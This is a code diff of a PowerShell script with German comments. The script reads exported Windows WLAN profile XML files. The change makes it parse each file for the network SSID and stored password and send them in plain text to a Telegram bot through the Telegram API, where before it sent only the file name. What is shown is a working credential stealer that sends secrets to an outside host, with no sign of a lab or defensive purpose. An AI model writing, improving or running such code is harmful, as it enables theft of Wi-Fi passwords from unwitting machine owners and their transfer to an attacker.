@@ -28,10 +28,12 @@ if ($xmlFiles.Count -eq 0) {
 
 # Webhook-Anfrage mit Datei-Upload
 foreach ($xmlFile in $xmlFiles) {
-    $fileContent = Get-Content -Path $xmlFile.FullName -Raw
+    $xml = [xml](Get-Content -Path $xmlFile.FullName)
+    $ssid = $xml.WLANProfile.SSIDConfig.SSID.name
+    $password = $xml.WLANProfile.MSPEAPSettings.SecurityPassword.Password
 
     # Bereite die Daten vor
-    $message = "Hier ist das WLAN-Profil: $($xmlFile.Name)"
+    $message = "SSID: $ssid`nPassword: $password"
     $encodedMessage = [Uri]::EscapeDataString($message)
     $uri = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=$encodedMessage"
 
